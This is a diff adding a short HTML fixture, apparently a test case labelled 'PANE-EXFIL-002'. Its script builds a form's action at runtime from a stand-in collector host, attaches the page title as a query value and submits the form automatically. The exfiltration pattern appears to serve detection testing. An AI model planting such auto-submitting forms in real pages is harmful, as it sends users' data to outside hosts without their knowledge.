@@ -1,0 +1,11 @@
+<!--
+  PANE-EXFIL-002. The markup is clean; the destination arrives at runtime.
+-->
+<form id="f"><input name="d"></form>
+<script>
+  const f = document.getElementById('f');
+  const sink = 'https://collector.invalid';
+  f.action = sink + '/c?k=' + document.title;
+  f.setAttribute('action', sink + '/c2');
+  f.submit();
+</script>
